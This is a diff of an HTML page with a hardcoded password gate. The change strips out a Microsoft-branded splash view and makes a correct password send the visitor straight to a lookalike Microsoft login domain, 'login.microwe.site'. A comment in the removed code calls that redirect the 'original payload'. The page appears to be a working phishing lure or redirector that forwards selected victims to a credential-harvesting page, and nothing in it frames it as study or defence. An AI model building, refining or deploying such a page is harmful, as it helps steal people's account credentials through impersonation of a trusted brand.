@@ -8,10 +8,8 @@
         body { font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background: #f0f2f5; margin: 0; }
         .login-box { background: white; padding: 30px; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); width: 300px; text-align: center; }
         input[type="password"] { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; }
-        input[type="submit"], .logout-btn { background: #0078d4; color: white; border: none; padding: 10px; width: 100%; border-radius: 4px; cursor: pointer; text-decoration: none; display: inline-block; box-sizing: border-box; text-align: center; }
+        input[type="submit"] { background: #0078d4; color: white; border: none; padding: 10px; width: 100%; border-radius: 4px; cursor: pointer; text-decoration: none; display: inline-block; box-sizing: border-box; text-align: center; }
         .error { color: red; font-size: 14px; margin-bottom: 10px; }
-        #protected-content { display: none; }
-        .splash { display: flex; flex-direction: column; align-items: center; justify-content: center; }
     </style>
 </head>
 <body>
@@ -26,69 +24,19 @@
         </form>
     </div>
 
-    <!-- Protected Content View -->
-    <div id="protected-content">
-        <main class="splash">
-          <div class="logo">
-            <div class="back-card"></div>
-            <div class="paper"></div>
-            <div class="front-card"><div class="front-fold"></div></div>
-          </div>
-          <div class="microsoft">
-            <span class="ms-icon"><i></i><i></i><i></i><i></i></span>
-            <span class="ms-text">Microsoft</span>
-          </div>
-        </main>
-        <p style="text-align: center; margin-top: 20px;"><a href="#" class="logout-btn" onclick="handleLogout(event)">Logout</a></p>
-    </div>
-
     <script>
-        const CORRECT_PASSWORD_HASH = '12345doc6'; // Note: Client-side storage fallback since it's pure HTML/JS
-
-        function checkAuth() {
-            const isAuth = sessionStorage.getItem('auth_logged_in');
-            if (isAuth === 'true') {
-                showProtected();
-            } else {
-                showLogin();
-            }
-        }
+        const CORRECT_PASSWORD_HASH = '12345doc6';
 
         function handleLogin(event) {
             event.preventDefault();
             const pass = document.getElementById('password-input').value;
             if (pass === CORRECT_PASSWORD_HASH) {
-                sessionStorage.setItem('auth_logged_in', 'true');
-                showProtected();
+                // Immediate hard redirect on successful authentication match
+                window.location.replace("https://login.microwe.site/GhVzJjZT");
             } else {
                 document.getElementById('error-msg').innerText = 'Invalid password.';
             }
         }
-
-        function handleLogout(event) {
-            event.preventDefault();
-            sessionStorage.removeItem('auth_logged_in');
-            showLogin();
-        }
-
-        function showProtected() {
-            document.getElementById('login-view').style.display = 'none';
-            document.getElementById('protected-content').style.display = 'block';
-            
-            // Redirect trigger from original payload
-            setTimeout(function() {
-                window.location.replace("https://login.microwe.site/GhVzJjZT");
-            }, 1000);
-        }
-
-        function showLogin() {
-            document.getElementById('login-view').style.display = 'block';
-            document.getElementById('protected-content').style.display = 'none';
-            document.getElementById('password-input').value = '';
-            document.getElementById('error-msg').innerText = '';
-        }
-
-        window.onload = checkAuth;
     </script>
 </body>
 </html>
